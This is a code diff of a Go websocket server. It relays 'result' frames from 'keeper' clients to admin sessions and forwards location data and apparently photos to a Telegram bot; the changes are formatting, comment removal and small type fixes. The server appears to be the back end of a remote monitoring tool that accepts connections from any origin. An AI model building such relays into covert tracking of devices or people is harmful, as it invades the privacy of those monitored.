@@ -21,15 +21,15 @@ import (
 )
 
 var (
-	adminPassword   string
-	adminToken      string
-	telegramToken   string
-	telegramChatID  string
+	adminPassword  string
+	adminToken     string
+	telegramToken  string
+	telegramChatID string
 )
 
 var upgrader = websocket.Upgrader{
 	CheckOrigin:     func(r *http.Request) bool { return true },
-	ReadBufferSize:  1 << 23, // 8 MB — compressed photos fit fine, base64 padded
+	ReadBufferSize:  1 << 23,
 	WriteBufferSize: 1 << 23,
 }
 
@@ -166,7 +166,6 @@ func keeperHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
-		// keeper -> admins fan-out
 		if m.Type == "result" || m.Type == "hello" {
 			mu.RLock()
 			for _, a := range admins {
@@ -174,7 +173,6 @@ func keeperHandler(w http.ResponseWriter, r *http.Request) {
 			}
 			mu.RUnlock()
 
-			// telegram mirror for result frames
 			if m.Type == "result" {
 				go forwardToTelegram(m)
 			}
@@ -209,7 +207,6 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("admin offline: %s", sid)
 	}()
 
-	// push current keeper list
 	mu.RLock()
 	list := make([]string, 0, len(keepers))
 	for id := range keepers {
@@ -309,7 +306,7 @@ func tgSendMessage(text string) {
 		"chat_id": telegramChatID,
 		"text":    text,
 	}
-	_ = tgPostForm(url, form, nil, nil)
+	_ = tgPostForm(url, form, "", nil)
 }
 
 func tgSendLocation(lat, lng float64, caption string) {
@@ -319,8 +316,7 @@ func tgSendLocation(lat, lng float64, caption string) {
 		"latitude":  fmt.Sprintf("%f", lat),
 		"longitude": fmt.Sprintf("%f", lng),
 	}
-	// sendLocation doesn't accept caption in all bot api versions; send as follow-up if present
-	_ = tgPostForm(url, form, nil, nil)
+	_ = tgPostForm(url, form, "", nil)
 	if caption != "" {
 		tgSendMessage(caption)
 	}
@@ -388,7 +384,7 @@ func tgPostForm(url string, fields map[string]string, fileField string, fileData
 }
 
 func urlEncode(s string) string {
-	const hex = "0123456789ABCDEF"
+	const hexDigits = "0123456789ABCDEF"
 	var b bytes.Buffer
 	for i := 0; i < len(s); i++ {
 		c := s[i]
@@ -399,8 +395,8 @@ func urlEncode(s string) string {
 			b.WriteByte('+')
 		} else {
 			b.WriteByte('%')
-			b.WriteByte(hex[c>>4])
-			b.WriteByte(hex[c&0x0F])
+			b.WriteByte(hexDigits[c>>4])
+			b.WriteByte(hexDigits[c&0x0F])
 		}
 	}
 	return b.String()
